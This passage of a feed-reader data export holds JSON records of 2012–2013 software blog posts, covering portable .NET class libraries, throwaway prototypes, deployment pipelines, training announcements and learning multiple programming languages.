href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~updatecontrols.net/cs/\">UpdateControls</a></li></ul><p>IoC<ul><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~code.google.com/p/autofac/\">Autofac</a><li>Ninject<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/onovotny/ninject\">portable</a><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/onovotny/ninject\">fork</a><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~portableioc.codeplex.com/\">PortableIoC</a><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/jonathanpeppers/XPlatUtils\">XPlatUtils</a>(IoC and Messenger)</li></ul><p>Other<ul><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~json.codeplex.com/\">Json.NET</a><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/mbrit/metrolog\">MetroLog</a><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bloggingabout.net/blogs/vagif/archive/2013/02/12/intoducing-simple-odata-client-a-portable-odata-client-library-for-net4-x-windows-store-silverlight-5-and-windows-phone-8.aspx\">Simple.Odata</a><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~oxyplot.codeplex.com/\">OxyPlot</a></li></ul><p>and of course, my favorite, the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/NuGetPackageOfTheWeek13PortableHttpClientMakesPortableLibrariesMoreUseful.aspx\">HttpClient</a>, making HTTP calls easier, since, well, since a few months ago.</p><pre class=\"brush: csharp; toolbar: false; auto-links: false;\">public static async Task&lt;HttpResponseMessage&gt; GetTheGoodStuff()<br>{<br>var httpClient = new HttpClient();<br>HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get,\"http://hanselman.com/blog/\");<br>var response = await httpClient.SendAsync(request);<br>return response;<br>}</pre><h3>//build/</h3><p>One BUILD attendee took issue with the fact that speakers were telling people that you can't use platform specific functionality from a Portable Class Library, and wrote a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.cognitiveinheritance.com/post/Using-Target-Specific-Code-in-a-Portable-Library.aspx\">blog post</a>about how you can do this with abstraction and (preferably) dependency injection.<blockquote><p>On at least 2 occasions recently, I have heard speakers tell their audience that you cannot reference a target-specific .NET library (such as a .NET Framework 4.5 library) from a Portable Class Library. While this is technically true, it doesn't tell nearly the whole story. Even though we can't reference target-specific libraries, we can still USE these libraries. We can call their methods and access their properties under the right circumstances. We can gain access to these libraries via an abstraction. My preferred method of doing this is...Dependency Injection.</p></blockquote><h3>Cross Platform .NET Coolness</h3><p>There's lots of great examples of code reuse,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselminutes.com/343/draw-a-stickman-epic-an-iphone-android-and-windows-8-game-with-monogame\">like the podcast I did with the folks who wrote\"Draw a Stickman EPIC.\"</a>This app has 95%+ code reuse, all written in C# and is available in every App Store there is. Here's a few others.</p><p align=\"left\">Also, be sure to check out my talk from the Xamarin Evolve Conference -<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/XamarinEvolve2013TalkVideoHowCSavedMyMarriage.aspx\">How C# Saved My Marriage</a>. I talk about Portable Libraries in this talk. We'll hear more about Portable Libraries at the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~monkeyspace.org\">MonkeySpace Conference in Chicago in July of 2013</a>.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.lionsrugby.com/lions_official_apps.php\"><img title=\"clip_image001[6]\"style=\"display: inline\"alt=\"clip_image001[6]\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/edddd7571ec7_CAED/clip_image001%5B6%5D_1.jpg\"width=\"613\"height=\"342\"></a></p><p>The<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~apps.microsoft.com/windows/en-gb/app/lions-official/3332d376-1068-45e6-8b46-4888b6739d9d\">British and Irish Lions app</a>is a cross platform app<strong>targeting Windows Store, Windows Phone, iOS and Android</strong>. It uses Portable Class Libraries to share common code across platforms, Azure to host the services it uses, and the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/slodge/MvvmCross\">MvvmCross</a>MVVM framework which I'm a huge fan of. The UK MSDN blog posted a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~blogs.msdn.com/b/ukmsdn/archive/2013/06/25/behind-the-scenes-with-the-british-and-irish-lions-apps-windows-azure-server-architecture.aspx\">case study</a>of the development of the app, and there is also a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.sequence.co.uk/case-studies/british-irish-lions\">prettier case study</a>(with screenshots, infographics, etc) and a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.sequence.co.uk/blog/mvvmrules\">blog post</a>by the developers.  In reference to Xamarin, MvvmCross, and Portable Class libraries, they state\"Given the very short time-scales for the Lions apps (less than three months from the first line of code to our first release),<b>we simply could not have delivered a rich native experience across all platforms without the common core</b>.\"<p><img title=\"Lions Rugby\"style=\"display: inline\"alt=\"Lions Rugby\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/edddd7571ec7_CAED/clip_image001%5B8%5D_1.jpg\"width=\"245\"height=\"435\"><p>Another cross platform app that uses MvvmCross is<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.aviva.co.uk/drive/\">Aviva Drive</a>.  This is an insurance company app that you can use to track your driving habits and hopefully get a discount on your insurance.  The app was featured in the Tech Ed Europe<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~channel9.msdn.com/Events/TechEd/Europe/2013/Key01#fbid=FG_tdd_-6lt\">day 1 keynote</a>(about 28:40 in), focusing on how it used Azure.<p>On the game side of things,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.windowsphone.com/en-us/store/app/taptitude/b5145820-3e71-e011-81d2-78e7d1fa76f8\">Taptitude</a>is a successful Windows Phone 7 game (or rather, a collection of minigames) which<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~taptitude.fourbrosstudio.com/Home/CrossPlatformTaptitude\">was ported</a>to Windows Phone 8, Windows Store, iOS, and Android with the help of MonoGame and Xamarin.  The team reports that they have more than 99% shared code between all the platforms, which is especially important to them because they ship updates to the game about every week.<h3>Xamarin</h3><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~scan.xamarin.com/\"><img title=\"Scan.Xamarin.com\"style=\"display: inline\"alt=\"Scan.Xamarin.com\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/edddd7571ec7_CAED/Screen-Shot-2013-06-25-at-7_49_18-AM_3.png\"width=\"614\"height=\"372\"></a><p>Xamarin has released an amazing<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~scan.xamarin.com/\"><strong>.NET Mobility Scanner</strong></a><strong></strong>which analyzes code and tells you how\"portable\"it is and how compatible it will be with Xamarin.Android, Xamarin.iOS, Windows Phone, and Windows Store.  It lists all the APIs your code uses that aren't available on all the platforms, and an overall percentage of how portable your code is.  It's a very slick implementation and similar to what we've wanted to have for Portable Class Libraries.  Here's a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~scan.xamarin.com/Home/Report?scanId=cdf9b2f6-912f-4083-8fb2-ff80108326da\">sample report</a>for the SignalR client library.<strong>The best part is that it does all this analysis without sending your code or binaries to Xamarin.</strong>It all happens in the browser. I love Xamarin.<p>Phil Haack (former PM for<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~ASP.NET\">ASP.NET</a>MVC and now working at GitHub) wrote a blog post titled<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~haacked.com/archive/2013/06/24/platform-limitations-harm-net.aspx\">Platform Limitations Harm .NET</a>.  He argues that the Windows platform limitations should be removed from the EULAs for BCL NuGet packages.<p>I personally agree. Being able to reuse existing code, make portable libraries, and write apps that run in 64k or 64gigs is what makes .NET an interesting platform.</p><br/><hr/>©2013 Scott Hanselman. All rights reserved.<br/></div><Img align=\"left\"border=\"0\"height=\"1\"width=\"1\"style=\"border:0;float:left;margin:0;padding:0\"hspace=\"0\"src=\"http://feeds.hanselman.com/~/i/43282970/0/scotthanselman\"><div style=\"clear:both;padding-top:0.2em;\"><a title=\"Like on Facebook\"href=\"http://feeds.hanselman.com/_/28/43282970/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/fblike20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Share on Google+\"href=\"http://feeds.hanselman.com/_/30/43282970/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/googleplus20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Tweet This\"href=\"http://feeds.hanselman.com/_/24/43282970/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/twitter20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by email\"href=\"http://feeds.hanselman.com/_/19/43282970/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/email20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by RSS\"href=\"http://feeds.hanselman.com/_/20/43282970/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/rss20.png\"style=\"border:0;margin:0;padding:0;\"></a> </div>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1174}}
{"k":"0000000084","o":"0000005812","v":"001"}
{"_id":1175,"_uid":1175,"_dt":1373742620953,"_s":"f0596fc2bd521183b7a17a5c42c687b6"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/8snaEJKeQQg/","title":"Build one to throw away","published":{"$wrap":"$date","v":1347140290000,"h":"2012-09-08T21:38:10.000Z"},"starred":false,"read":false,"content":"<p><img src=\"http://www.udidahan.com/wp-content/uploads/recycle.jpg\" alt=\"recycle\" title=\"recycle\" width=\"250\" height=\"165\" style=\"float:right; margin-left: 10px; margin-bottom:10px;\" />There’s a pattern I’ve seen with companies that are starting on a large green-field project that gets them into trouble later on that I wanted to call out because the pitfall is quite subtle.</p><p>It’s something I touched on in my presentation last week about Balancing Architecture & Agile at the Agile Practitioners group in Israel but didn’t have as much time to get into.</p><h3>Agile</h3><p>You see, at the beginning of these projects, often our users or customers don’t exactly know what they want. Even if you go through some process of doing mock-ups, sometimes users can’t really know what they want until they can interact with working software.</p><p>This is one of the advantages of an agile approach that focuses on getting working software in the hands of users very early. It allows us to mitigate the risk of us building the wrong system.</p><h3>Pitfalls</h3><p>The mistake here is believing that this needs to be done in a production-ready manner, using all of the super-scalability and highly reliable infrastructural elements in our target deployment environment. </p><p>While there is value in building real functionality on top of your production infrastructure to learn more about the challenges in doing that and in that process, refining the API of your platform, baking more capabilities into it, etc, the problem is that you are slowing down the important learning of what system needs to be built.</p><p>Decouple those two things.</p><h3>Build one to throw away.</h3><p>Sometimes, the way to be most effective is to be somewhat inefficient.</p><p>Once you’ve gotten your users to the point that they can point at a piece of working software and say, “Yes – build me that”, then you can go about building it the right way on top of your production platform.</p><p>Let me go a step further, just to be crystal clear.</p><p>Do not unit-test that code. Do not use TDD, DDD, CQRS, Event Sourcing, SOA, etc.</p><p>Just get it done.</p><h3>Architecture</h3><p>You also want to have a good understanding of the use cases in your system before you make too many big architectural decisions (where that might even be just 1 decision, but you only find out after the fact). Some use cases are architecturally significant – many aren’t. This falls under the “just enough architecture up-front”, but is really very dependent on the experience and skills of the people on your team so I really can’t give you anything more prescriptive.</p><p>Of course, there’s another risk around this approach.</p><h3>Organizational Dysfunction</h3><p>In some organizations, there isn’t enough of an understanding or appreciation of the difference between production-ready software and a prototype. I think we’ve all been through this at one time or another. If users see “the software” works, we might be forced to deploy the prototype – all our protests for naught.</p><p>If this is the environment you’re in, don’t worry about it.</p><p>Seriously – don’t.</p><h3>Growing up</h3><p>You can explain to a child that fire is hot, and that they will get burned if they stick their hand in it, but all of that is theoretical – it doesn’t really sink in, because they haven’t yet had a visceral experience of “hot”. </p><p>If the organization you’re in isn’t that mature yet, they’re going to have to get burned a couple of times until they learn. The only thing you can do as a responsible adult is to *try* to get them started with smaller burns so that they’ll learn the lessons with the minimal amount of pain.</p><p>Given that the people doing the learning are higher up the food-chain, you really don’t have much influence. Accept that and move on. If necessary, cover your assets – write an email containing the “meeting minutes” in which you describe the concerns that you raised and that the decision was made against your recommendations – but phrase it gently. Depending on the state of the economy and your network, it might be a good time to start job-hunting.</p><h3>In closing</h3><p>I said it before but it bears repeating:</p><p>Efficiency is secondary to effectiveness.</p><p>You want to make sure your headed in the right direction before putting the pedal to the metal.</p><p>Rework is to be accepted and, yes, even embraced.</p><p><a href=\"http://37signals.com/rework\">There’s even a book about it</a>.</p><p>Have fun.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=8snaEJKeQQg:Wlo-uQqqniA:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=8snaEJKeQQg:Wlo-uQqqniA:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=8snaEJKeQQg:Wlo-uQqqniA:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=8snaEJKeQQg:Wlo-uQqqniA:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=8snaEJKeQQg:Wlo-uQqqniA:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/8snaEJKeQQg\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1175}}
{"k":"0000000084","o":"0000001917","v":"001"}
{"_id":1176,"_uid":1176,"_dt":1373742620954,"_s":"f06109a20cc4c003a025ec5268957a5f"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/9ufTUIIsbHk/","title":"Uploaded some old “Ask Udi” podcasts","published":{"$wrap":"$date","v":1362851443000,"h":"2013-03-09T17:50:43.000Z"},"starred":false,"read":false,"content":"<p>I’ve been able to track down the files for some of my old “Ask Udi” podcasts. I haven’t listened through them again, so it could be that some of the stuff in there is someone dated, and/or that my perspectives have changed, but there is probably some good stuff in there regardless.</p><p>Enjoy:</p><p><a href=\"http://www.udidahan.com/wp-content/uploads/060518ud01.mp3\">060518ud01.mp3</a><br/><br /><a href=\"http://www.udidahan.com/wp-content/uploads/060808ud01.mp3\">060808ud01.mp3</a><br/><br /><a href=\"http://www.udidahan.com/wp-content/uploads/060831ud01.mp3\">060831ud01.mp3</a><br/><br /><a href=\"http://www.udidahan.com/wp-content/uploads/061017ud01.mp3\">061017ud01.mp3</a><br/></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=9ufTUIIsbHk:dRfFvX8XlX4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=9ufTUIIsbHk:dRfFvX8XlX4:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=9ufTUIIsbHk:dRfFvX8XlX4:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=9ufTUIIsbHk:dRfFvX8XlX4:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=9ufTUIIsbHk:dRfFvX8XlX4:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/9ufTUIIsbHk\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1176}}
{"k":"0000000084","o":"0000002285","v":"001"}
{"_id":1177,"_uid":1177,"_dt":1373742620954,"_s":"33cf5c48d6feebaad9c58d86b97eef66"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/bliki/DeploymentPipeline.html","title":"Bliki: DeploymentPipeline","published":{"$wrap":"$date","v":1369922460000,"h":"2013-05-30T14:01:00.000Z"},"starred":false,"read":false,"content":"<p>One of the challenges of an automated build and test environmentis you want your build to be fast, so that you can get fastfeedback, but comprehensive tests take a long time to run. Adeployment pipeline is a way to deal with this by breaking up yourbuild into stages. Each stage provides increasing confidence,usually at the cost of extra time. Early stages can find mostproblems yielding faster feedback, while later stages provide slowerand more through probing. Deployment pipelines are a central partof<a href=\"http://martinfowler.com/bliki/ContinuousDelivery.html\">ContinuousDelivery</a>.</p><p>Usually the first stage of a deployment pipeline will do anycompilation and provide binaries for later stages. Later stages mayinclude manual checks, such as any tests that can't be automated.Stages can be automatic, or require human authorization to proceed,they may be parallelized over many machines to speed up the build.Deploying into production is usually the final stage in a pipeline.</p><p>More broadly the deployment pipeline's job is to detect anychanges that will lead to problems in production. These can includeperformance, security, or usability issues. A deployment pipelineshould enable collaboration between the various groups involved indelivering software and provide everyone visibility about the flowof changes in the system, together with a thorough audit trail.</p><p>A good way to introduce continuous delivery is to model yourcurrent delivery process as a deployment pipeline, then examine thisfor bottlenecks, opportunities for automation, and collaboration points.</p><p>For more information see chapter 5 of the<a href=\"/books/continuousDelivery.html\">Continuous Delivery book</a>,available as a<a href=\"http://www.informit.com/articles/article.aspx?p=1621865\">freedownload</a>.</p><div class=\"acknowledgements\"><h2>Acknowledgements</h2><a href=\"http://continuousdelivery.com/\">Jez Humble</a>provided detailed help with this page.</div>","author":false,"_id":{"$wrap":"$oid","v":1177}}
{"k":"0000000084","o":"0000005054","v":"001"}
{"_id":1178,"_uid":1178,"_dt":1373742620954,"_s":"b97584f4c69ba53e0f0d29cb7489ad15"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/xrvucXx1q0U/","title":"Training for this winter","published":{"$wrap":"$date","v":1350022008000,"h":"2012-10-12T06:06:48.000Z"},"starred":false,"read":false,"content":"<p>I wanted to let you know that registration has opened for several new locations this winter – this time, some courses will even be delivered in Spanish.</p><h3>Spain</h3><p>Marçal Serrate will be teaching the Enterprise Development with NServiceBus course in Spanish in:</p><ul><li>Barcelona on Nov 26 – <a href=\"http://masterarquitecturabcn.eventbrite.com/\">register here</a></li><li>Madrid on Dec 10 – <a href=\"http://masterarquitecturamad.eventbrite.com/\">register here</a></li></ul><p>Marçal has been working with NServiceBus for a couple of years now building a very large system for an insurance company and knows all the ins and outs of taking NServiceBus live at scale – including all the infrastructure issues of big deployments.</p><p>We’re very happy to have him bringing NServiceBus to the Spanish-speaking community.</p><h3>Other locations</h3><p>Jimmy Bogard will be giving the next NServiceBus course in <a href=\"http://www.headspring.com/services/developer-training/nservicebus-boot-camp\">Austin</a> in 2 weeks – Oct 23 and then heading over to <a href=\"http://skillsmatter.com/course/open-source-dot-net/udi-dahan-nservicebus-workshop/ud-886\">London</a> to teach it with our good friends from Skills Matter on Dec 4.</p><h3>SOA – US, UK, AU, IL, DE</h3><p>In addition to teaching my 5-day course in <a href=\"http://nservicebus.eventbee.com/event?eid=977435214\">Miami</a> on Nov 5, I’ll also be dropping by the Tallahassee Code Camp as a guest on the Dot Net Rocks Road Trip, so if you’re in the area, come by and say hello.</p><p>I’m also going to be teaching my course in <a href=\"http://www.eventbee.com/v/nservicebus/event?eid=918444435\">Denver Colorado</a> early next year, Jan 14 and it’ll be my first time there. I’m still looking for the right venue so if you have any recommendations, I’d love to hear them.</p><p>Of course, I will be back in <a href=\"http://skillsmatter.com/course/design-architecture/advanced-distributed-systems-design-with-soa/ud-886\">London</a>  one more time this year, Dec 3 and won’t be forgetting my local peeps in <a href=\"http://www.sela.co.il/syl/Syllabus.aspx?CourseCode=AdvDistDahan&CategoryID=165\">Israel</a> either – that’s on Dec 23.</p><p>Since I had such a wonderful time in <a href=\"http://www.professional-developer-training.net/items.aspx?catId=c45\">Germany</a> last time, I’ll also be back again next year on Jan 28 because who couldn’t appreciate a venue like the Hackers Hotel, not just for its name, but the chairs in the dining room are kind of like thrones – makes you feel like you’re getting the royal treatment.</p><p>Finally, for the guys down-under – this time I’m going to <a href=\"http://www.eventbee.com/v/nservicebus/event?eid=948045332\">Perth</a>. The past 3 years were always Sydney, Sydney, Sydney and I think that I should see more of the country. We’ve just about finalized the venue with Cliftons but figured that we might as well open up registration too – the course will be on Feb 11.</p><h3>In closing</h3><p>Yes, just like this past year, I’ll be travelling quite a bit – trying to get the good word out. I hope you’ll be able to make one of these dates – it’s always great meeting some of my long-time blog readers. </p><p>One time I gave the course this year, and there wasn’t a single person who’d read my blog there – and in a public course, no less! Not that I’m complaining, of course, because often times people who’ve already been on the course recommend it to their colleagues who might not be big blog readers, but it was kind of a surreal moment for me.</p><p>Anyway, that’s all the announcements for now.</p><p>If you need the full information on these courses, you can see it all up on my training page <a href=\"http://www.udidahan.com/training/\">here</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=xrvucXx1q0U:fe-BuW_VqGg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=xrvucXx1q0U:fe-BuW_VqGg:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=xrvucXx1q0U:fe-BuW_VqGg:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=xrvucXx1q0U:fe-BuW_VqGg:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=xrvucXx1q0U:fe-BuW_VqGg:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/xrvucXx1q0U\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1178}}
{"k":"0000000084","o":"0000007223","v":"001"}
{"_id":1179,"_uid":1179,"_dt":1373742620954,"_s":"196815f6baced413f45fe57e08934bb5"}
{"subscription":{"$wrap":"$oid","v":37},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/PIz2b8ykqmw/knowing-more-programming-languages-will-make-you-smarter","title":"Knowing More Programming Languages Will Make You Smarter","published":{"$wrap":"$date","v":1368457200000,"h":"2013-05-13T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>There's a thought in neuroscience/psychological circles that words are much more than sounds that represent things: they are the abstraction of our higher brain function. Words are language, code is language. Restricting yourself to one or two languages is limiting your cognitive abilities</p><p><img src='http://wekeroad.com/images/language_map.png'/></p><p><p><em>image from<a href=\"http://visual.ly/network-graph-programming-languages-influence\">http://visual.ly/network-graph-programming-languages-influence</a></em></p><h2>Words as a Conceptual Map</h2><p>There's a small bit of setup here - bear with me.<a href=\"http://www.radiolab.org/2010/aug/09/\">I relistened to one of my favorite RadioLab podcasts ('Words')</a>this weekend and had my mind blown, once again. They dug into<strong>what words mean</strong>to us and, according to the show, words are much more than expression vehicles.</p><p><strong>Words are the very structure of our higher reasoning</strong>.</p><p>In other words:<em>if you can't say it, you can't think it.</em>The words themselves are cognitive variables strung together to represent feeling, emotion, memory - abstract things made concrete by the words we put to them.</p><p>High-minded stuff and rather than regurgitate the whole show here - go listen if you haven't, it's very good. It left me quite inspired and I wondered if the the ideas in the show could extend to programming languages. Why not? Code is simply syntax laid on top of process that a machine needs to understand... hmmm....</p><p>We tell machines how to think - which directly reflects how we think. Writing code always seemed like such a\"machine-y\" thing to do, but I think that's not the case:<strong>Programming languages are true languages</strong>written for us to describe problems that a machine can understand.</p><p>These languages are stripped of nuance and imbued with functionality (loops, terse conditionals) for a myriad of problems.<em>How well do you speak code?</em></p><h2>A Thought Experiment</h2><p>Code is language, and how we solve problems with a given programming language directly relates to<strong>how we think in that language</strong>. This doesn't seem like an amazing revelation in and of itself - in fact I think you probably already understood this quite well.</p><p>But what if we reversed it? What if you couldn't think any other way - other than what that language<em>allowed you to think</em>. What if your coding language of choice<strong>was the abstraction over your programming thought process</strong>- that you actually lacked the mental faculties that lie outside of what that language can represent?</p><p>Let's say you walk into an interview and you get hit with a classic interview question (no, not FizzBuzz):<strong>write a routine that spits out Fibonacci numbers</strong>. It's something every dev has had to do at some point.</p><p>Now, slow your brain down and rewind. What language are you using to express this? What is that language<strong>allowing you to do</strong>.</p><p>If the only programming language you know is C# you're probably writing some LINQ in your mind and running a modulus. If you use Javascript you're probably doing something similar but maybe spread over two functions utilizing callbacks.</p><p>Rubyists out there might do something similar - favoring a more idiomatic approach with blocks/yield rather than a terse one-liner.</p><p><strong>Now write it using a Monad</strong>.</p><p><strong>Recursion?</strong></p><p>I'm sure a few of my readers could do all the above (LINQ, callbacks/blocks, Monad and Recursion) but I doubt that most of you can. This is due to the languages you know, the idioms they use, and<strong>the way those languages allow you to think about a problem</strong>.</p><h2>Expanding Your Thought Process</h2><p>I don't know anything about monads but I've done recursive programming in the past (sometimes not-intentionally). When I started using Ruby, I began to value the idiom of passing control back and forth using blocks and yield. You can do this in many languages - but for some reason it wasn't something I routinely did in C#.</p><p>The asynchronous nature of Javascript has awakened a part of my mind to evented programming. Again you can do this in many languages but it's idiomatic in Javascript and Node.</p><p>I can\"think\" in these terms and solve problems in ways I could never do when I knew only one language well (C#). At the time I liked the idea of\"going deep\" - of knowing a language so thoroughly that I could solve any problem with it and not clutter my mind with the different syntaxes of other languages.</p><p>I'm glad I didn't. And listening to that Radiolab podcast this last weekend made me understand why. I used to think it was that learning new languages would help me\"think differently\" but now I know it's more than that:<strong>I'm smarter now</strong>.</p><p>I'm not an egotistical guy and it hurts a bit to write that last paragraph - as if I'm suggesting that I'm smarter than people who know only one programming language -<strong>which is clearly not true</strong>. My point is only that<em>I'm smarter than I was 4 years ago</em>and the reason I think that is because I can solve problems in more ways than I could before and if my definition of\"intellect\" is accurate...</p><p><img src=\"/images/intellect.png\" alt=\"Definition of'Intellect'\"></p><p>... then yeah: I think it's OK to say I'm smarter than I was with respect to programming.</p><p>The thing I enjoy most about all of this is that I would never have thought about this until I heard that Radiolab podcast. They put the words to the very idea that words are our higher reasoning.</p><p>A lovely bit of recursive fun.</p><p><strong>Would I have recognized that recursion a few years ago? Hmmmm....</strong></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/PIz2b8ykqmw\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1179}}
{"k":"0000000084","o":"0000009540","v":"001"}
{"_id":1180,"_uid":1180,"_dt":1373742620955,"_s":"7a1128e1164e6d9c60953eaccbc5d1aa"}
